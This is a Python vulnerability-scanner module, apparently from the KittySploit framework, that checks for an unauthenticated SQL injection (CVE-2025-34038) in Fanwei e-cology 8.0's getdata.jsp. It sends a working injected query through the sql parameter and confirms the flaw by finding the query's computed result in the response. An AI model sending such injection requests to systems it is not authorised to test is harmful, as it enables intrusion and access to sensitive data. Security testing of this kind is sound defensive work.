#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Fanwei e-cology 8."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Fanwei e-cology - SQL Injection Detection',
        'description': 'Fanwei e-cology 8.0 contains a sql injection caused by unsanitized user input in the sql parameter of getdata.jsp, letting unauthenticated attackers execute arbitrary SQL queries and access sensitive data.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2025', 'ecology', 'sqli', 'vkev', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'http://wiki.peiqi.tech/PeiQi_Wiki/OA%E4%BA%A7%E5%93%81%E6%BC%8F%E6%B4%9E/%E6%B3%9B%E5%BE%AEOA/%E6%B3%9B%E5%BE%AEOA%20V8%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.html',
        ],
        'cve': 'CVE-2025-34038',
    }

    def run(self):
        r = self.http_request(method="GET", path='/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('474088963122',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="Fanwei e-cology - SQL Injection detected",
                path='/js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select+547653*865674+as+id',
            )
            return True
        return False

